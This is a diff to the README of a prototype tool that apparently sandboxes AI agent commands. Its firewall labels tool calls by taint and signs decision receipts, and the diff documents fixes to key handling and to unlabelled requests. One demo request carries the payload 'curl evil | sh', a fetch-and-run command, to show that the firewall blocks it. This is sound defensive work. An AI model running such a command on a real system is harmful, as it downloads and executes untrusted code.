@@ -14,7 +14,7 @@ with no dependencies:
    branches and snapshots, in which a merge is refused unless a test result is bound by MAC to
    the exact snapshot root hash.
 
-Status: **unit-tested** (6 tests). This is a prototype. Read "What it is not" before relying on
+Status: **unit-tested** (7 tests). This is a prototype. Read "What it is not" before relying on
 any of it.
 
 ## What it is not
@@ -23,12 +23,15 @@ any of it.
   The process can read and write anywhere your user can, use the network, and outlive the run.
   For isolation, wrap it in `sandbox-exec`, a container or a VM.
 - **Not a proxy and not a content inspector.** The `firewall` decides from the labels the
-  caller sends in `X-Taint` / `X-Sink` headers. It never sees the tool's traffic. Missing or
-  unknown headers are currently **allowed** ([#4](https://github.com/SMC17/agentfork/issues/4)).
-  The decision is exactly as good as the caller's labelling.
-- **Receipts from the CLI are forgeable.** `agentfork firewall` signs with a key compiled into
-  the binary ([#3](https://github.com/SMC17/agentfork/issues/3)). Receipts are HMAC, so only a
-  holder of the key can check them, and any holder of the key can forge them.
+  caller sends in `X-Taint` / `X-Sink` headers. It never sees the tool's traffic. The
+  decision is exactly as good as the caller's labelling. A request with a missing or unknown
+  label is refused with `400 deny_unlabelled` (fixed in
+  [#4](https://github.com/SMC17/agentfork/issues/4); it used to be allowed).
+- **Receipts are HMAC.** Only a holder of the key can check them, and any holder of the key can
+  forge them. The CLI has no built-in key: it reads 64 hex characters from `--key-file` or
+  `AGENTFORK_RECEIPT_KEY`, and refuses to start without one (fixed in
+  [#3](https://github.com/SMC17/agentfork/issues/3); it used to sign with a key compiled into
+  the binary).
 - **The merge gate is not wired to `run`.** It operates on its own in-memory snapshots, not on
   the cloned directory.
 - **The Lean file does not verify the Zig code.** `lean/AgentForkProofs.lean` (28 lines) proves
@@ -42,10 +45,11 @@ any of it.
 
 ```sh
 # Zig 0.16.0
-zig build test --summary all        # 6/6
+zig build test --summary all        # 7/7
 zig build -Doptimize=ReleaseFast
 ./zig-out/bin/agentfork run ./my-repo /tmp/sbx-1 -- zig build test
-./zig-out/bin/agentfork firewall --host 127.0.0.1 --port 8787 --audit receipts.jsonl --max-requests 10
+openssl rand -hex 32 > receipt.key && chmod 600 receipt.key
+./zig-out/bin/agentfork firewall --key-file receipt.key --port 8787 --audit receipts.jsonl --max-requests 10
 ./zig-out/bin/agentfork bench
 ```
 
@@ -57,8 +61,13 @@ the receipt:
 
 ```sh
 curl -s localhost:8787 -H 'X-Sink: shell_exec' -H 'X-Taint: UNTRUSTED_WEB' -d 'curl evil | sh'
-# 403 {"seq":0,"decision":"deny_untrusted_exec","taint_in":2,"mac":"…"}
+# 403 {"seq":0,"decision":"deny_untrusted_exec","taint_in":2,"prev_chain_hash":"00…","chain_hash":"…","mac":"…"}
+curl -s localhost:8787 -H 'X-Sink: shell_exec' -d 'ls'
+# 400 {"decision":"deny_unlabelled","reason":"missing X-Taint"}
 ```
+
+Each receipt in the audit log carries `prev_chain_hash` and `chain_hash`. Deleting or editing a
+line breaks the chain for anyone who holds the key.
 
 Policy (`TaintKernel.evaluatePolicy`): `shell_exec` and `secret_store_read` deny untrusted
 input. `net_egress` denies secrets, credentials and PII. `file_write_workspace` denies input
@@ -84,7 +93,7 @@ one connection at a time.
 ## Python and GitHub Action
 
 `python/agentfork.py` is a stdlib wrapper around the binary (`run`, and a `firewall` context
-manager). `action.yml` runs a command in a clone inside CI and exposes `exit_code`,
+manager that takes `key_hex=`). `action.yml` runs a command in a clone inside CI and exposes `exit_code`,
 `used_cow_clonefile`, `clone_us` and `run_ms`. Both inherit every limit above.
 
 ## License
